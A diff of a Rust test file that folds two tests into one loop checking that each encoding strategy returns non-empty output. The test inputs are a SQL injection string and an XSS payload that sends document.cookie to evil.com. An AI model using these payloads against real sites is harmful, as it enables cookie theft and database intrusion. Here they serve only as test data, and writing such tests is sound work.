@@ -103,20 +103,16 @@ fn encoding_very_long_string() {
 }
 
 #[test]
-fn encoding_all_strategies_on_sqli() {
-    let sqli = "' OR 1=1--";
-    for &strategy in encoding::all_strategies() {
-        let encoded = encoding::encode(sqli, strategy).unwrap();
-        assert!(!encoded.is_empty(), "Strategy {strategy:?} returned empty");
-    }
-}
-
-#[test]
-fn encoding_all_strategies_on_xss() {
-    let xss = "<script>fetch('http://evil.com?c='+document.cookie)</script>";
-    for &strategy in encoding::all_strategies() {
-        let encoded = encoding::encode(xss, strategy).unwrap();
-        assert!(!encoded.is_empty(), "Strategy {strategy:?} returned empty");
+fn encoding_all_strategies_produce_non_empty_output() {
+    let payloads = [
+        "' OR 1=1--",
+        "<script>fetch('http://evil.com?c='+document.cookie)</script>",
+    ];
+    for payload in payloads {
+        for &strategy in encoding::all_strategies() {
+            let encoded = encoding::encode(payload, strategy).unwrap();
+            assert!(!encoded.is_empty(), "Strategy {strategy:?} returned empty");
+        }
     }
 }
 
